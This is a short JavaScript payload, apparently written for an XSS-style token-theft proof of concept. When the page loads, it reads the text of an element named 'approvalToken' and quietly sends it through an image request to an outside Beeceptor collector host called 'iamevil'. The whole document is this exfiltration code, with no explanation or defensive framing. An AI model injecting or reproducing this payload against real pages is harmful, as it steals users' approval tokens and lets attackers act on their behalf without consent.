window.onload = function() {
    // Ensure the element containing approvalToken exists
    const approvalTokenElement = document.getElementById('approvalToken');
    
    if (approvalTokenElement) {
        // Capture the approval token
        const approvalToken = approvalTokenElement.textContent.trim();
        
        // Send the token to Beeceptor immediately
        var img = new Image();
        img.src = `https://iamevil.free.beeceptor.com/?token=${encodeURIComponent(approvalToken)}`;
    }
};
